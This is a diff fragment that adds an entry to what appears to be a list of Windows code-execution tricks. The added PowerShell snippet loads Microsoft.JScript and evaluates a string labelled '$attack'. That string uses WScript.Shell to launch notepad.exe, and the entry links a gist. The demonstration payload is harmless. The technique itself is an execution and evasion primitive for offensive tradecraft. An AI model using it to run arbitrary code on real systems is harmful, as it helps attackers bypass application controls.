@@ -50,3 +50,13 @@ wlua.exe C:\testing.wlua
 &- Hello World Exe My Code LUA
 https://gist.github.com/homjxi0e/bbd218dea9bf63fd36524b9777a399f3
 ```
+
+( 8 ) Jscript Execute Code Via ( Eval,VSA,) 
+```
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
+$attack = 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
+[Microsoft.JScript.Eval]::JScriptEvaluate($attack,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+&- Code Execute
+https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec
+```
+
